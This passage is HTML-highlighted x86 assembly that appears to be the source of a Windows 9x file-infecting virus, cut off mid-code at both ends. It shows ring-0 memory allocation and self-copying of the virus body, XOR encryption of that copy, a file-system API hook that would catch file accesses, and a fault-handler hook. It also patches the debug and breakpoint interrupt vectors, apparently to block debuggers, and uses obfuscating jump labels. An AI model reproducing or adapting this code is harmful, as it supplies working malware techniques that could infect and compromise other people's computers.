                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">@@vir_type</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__iret</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">@@vir_type</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__mmm2</span><span class="sc0">

</span><span class="sc5">__back</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">back_from_r0</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; INT stack frame-&gt;EIP</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@saveeip</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">  </span><span class="sc1">; eax=return address</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">__iret</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vx_done</span><span class="sc0">

                        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">__mmm2</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">@@is_dll</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__back</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@saveeip</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">back_from_r0_dll</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@kbase</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vx_done</span><span class="sc0">

                        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">naebka_3</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">naebka_4</span><span class="sc0">

</span><span class="sc5">back_from_r0_dll</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">sdata</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__eax_0</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">__eax_0</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">0ch</span><span class="sc0">

</span><span class="sc5">VMM_Begin_Critical_Section</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00001001Fh</span><span class="sc0">
</span><span class="sc5">VMM_End_Critical_Section</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000010020h</span><span class="sc0">

</span><span class="sc5">vx_init</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">110111b</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">_Begin_Critical_Section</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">vx_done</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">_End_Critical_Section</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">id_offs</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0040h</span><span class="sc0">
</span><span class="sc5">id_byte</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'Z'</span><span class="sc0">

</span><span class="sc5">ring0_code</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">cli</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">kernel_ptr_r3</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">id_offs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">id_byte</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__ret</span><span class="sc0">    </span><span class="sc1">; NC</span><span class="sc0">

</span><span class="sc5">VMM_PageAllocate</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000010053h</span><span class="sc0">
</span><span class="sc5">PAGEZEROINIT</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">PAGEFIXED</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000008h</span><span class="sc0">
</span><span class="sc5">PG_SYS</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGEFIXED</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PAGEZEROINIT</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; PhysAddr</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; maxPhys</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; minPhys</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Align</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; handle of VM = 0 if PG_SYS</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PG_SYS</span><span class="sc0">  </span><span class="sc1">; allocate memory in system area</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virPages</span><span class="sc1">; nPages</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">_PageAllocate</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">cli</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc1">; error?</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__ret_error</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; pointer to new r0 location</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r3_vir_copy</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size</span><span class="sc0">     </span><span class="sc1">; size of code</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PC_STATIC</span><span class="sc0">                  </span><span class="sc1">; OR_MASK</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">PC_WRITEABLE</span><span class="sc4">+</span><span class="sc5">PC_USER</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; AND_MASK</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virPages</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">_PageModifyPermissions</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">cli</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">__new_r0_loc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">__new_r0_loc</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r3_vir_copy</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">kernel_base</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_copy</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">id_offs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">id_byte</span><span class="sc0">

        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">id_offs</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xor_copy</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hook_IFS</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hook_faults</span><span class="sc0">

                        </span><span class="sc6">cli</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">
                        </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc5">r0_idt</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">r0_idt</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">eblo</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc5">eblo</span><span class="sc4">]</span><span class="sc5">.word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc5">eblo</span><span class="sc4">]</span><span class="sc5">.word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0CFh</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc5">eblo</span><span class="sc4">]</span><span class="sc5">.word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc5">eblo</span><span class="sc4">]</span><span class="sc5">.word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0CFh</span><span class="sc0">

</span><span class="sc5">__ret</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__ret_error</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">debug_beep</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">naebka_6</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">naebka_7</span><span class="sc0">

</span><span class="sc5">hook_IFS</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">IFSMGR_InstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000400067h</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ifs_handler</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR_InstallFileSystemApiHook</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__ret</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">oldhandler_ptr_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">entered</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">__ret</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">VMM_Hook_V86_Fault</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00001007Fh</span><span class="sc0">
</span><span class="sc5">VMM_Hook_PM_Fault</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000010080h</span><span class="sc0">
</span><span class="sc5">VMM_Hook_VMM_Fault</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000010081h</span><span class="sc0">

</span><span class="sc5">hook_faults</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fault_handler</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">_Hook_PM_Fault</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">fault_previous</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">VMM_Allocate_GDT_Selector</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000010076h</span><span class="sc0">
</span><span class="sc5">VMM_VMMCreateThread</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000010105h</span><span class="sc0">

</span><span class="sc5">get_base_ebp</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_base_eax</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">naebka_5</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">naebka_6</span><span class="sc0">

</span><span class="sc5">Client_Reg_Struc</span><span class="sc0">        </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">Client_EDI</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; client's EDI</span><span class="sc0">
</span><span class="sc5">Client_ESI</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; client's ESI</span><span class="sc0">
</span><span class="sc5">Client_EBP</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; client's EBP</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; ESP when pusha instruction is executed</span><span class="sc0">
</span><span class="sc5">Client_EBX</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; client's EBX</span><span class="sc0">
</span><span class="sc5">Client_EDX</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; client's EDX</span><span class="sc0">
</span><span class="sc5">Client_ECX</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; client's ECX</span><span class="sc0">
</span><span class="sc5">Client_EAX</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; client's EAX</span><span class="sc0">
</span><span class="sc5">Client_Error</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; doubleword error code</span><span class="sc0">
</span><span class="sc5">Client_EIP</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; EIP</span><span class="sc0">
</span><span class="sc5">Client_CS</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">; CS</span><span class="sc0">
</span><span class="sc5">Client_EFlags</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; EFLAGS</span><span class="sc0">
</span><span class="sc5">Client_ESP</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; ESP</span><span class="sc0">
</span><span class="sc5">Client_SS</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">; SS</span><span class="sc0">
</span><span class="sc5">Client_ES</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">; ES</span><span class="sc0">
</span><span class="sc5">Client_DS</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">; DS</span><span class="sc0">
</span><span class="sc5">Client_FS</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">; FS</span><span class="sc0">
</span><span class="sc5">Client_GS</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">; GS</span><span class="sc0">
</span><span class="sc5">Client_Alt_EIP</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Client_Alt_CS</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Client_Alt_EFlags</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Client_Alt_ESP</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Client_Alt_SS</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Client_Alt_ES</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Client_Alt_DS</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Client_Alt_FS</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
